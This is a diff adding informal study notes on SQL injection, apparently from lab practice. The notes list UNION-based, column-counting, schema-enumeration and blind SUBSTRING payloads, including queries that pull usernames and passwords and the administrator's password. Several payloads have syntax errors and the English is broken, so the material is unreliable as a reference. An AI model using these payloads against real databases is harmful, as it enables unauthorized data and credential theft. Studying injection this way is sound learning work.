@@ -1,5 +1,48 @@
 ## SQL injection
 
 - SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+- When pattern tags selection use a OR 1=1--
+- Info about database : Type and version
+- Tables and columns
+- Determine number of column and which contain a text data
 
-When pattern tags selection use a OR 1=1--
+### Oracle
+- `' UNION SELECT 'strings1' 'strings2' FROM dual` same result with because `NULL` is not defined data.
+- `' UNION SELECT NULL NULL FROM dual`
+- A `--` can count and if you use `--+` it possible that it a `Mysql` 
+`' ORDER BY 1--+`
+`' ORDER BY 2--+`
+`' ORDER BY 3--+` <- If not work is because you have only two columns used during query.
+
+### MySQL
+Switch between  `'abc' NULL` to `NULL, 'def'` is not important if two work test just one for column name
+`' UNION SELECT @@version, 'def'--+`
+
+### Non Oracle
+
+Check a number of columns used, 1, 2 ? It a strings / text column ?
+- `' ... table_name, column_name FROM information.schema.columns`
+
+### Oracle Again ?
+2 Columns work with `dual` table
+List table with : `SELECT table_name`, or Select columns of table with `column_name FROM all_column WHERE table =..` `..` is table of users found after previous request
+
+### Number of columns ?
+`NULL, NULL, NULL` ? with table name just `UNION SELECT username, password`
+
+### Multiple data in one column
+`' UNION SELECT NULL, username || '-' || password FROM users`
+
+### Blind SQLi
+UNION Attack not work always here
+
+`' AND '1'='1#` the end `'` added by sql himself during query construction is after  `#` break a command same thing for `--`
+
+### For SUBSTRING / SUBSTR 
+`SUBSTRING (colum_name, 3, 10)` is a third in 10 char strings
+So (2, 1) is second char in 1
+`' AND (SELECT SUBSTRING (password, 3, 1) FROM users WHERE users = 'administrator') = 'a`
+
+### Error Based
+
+
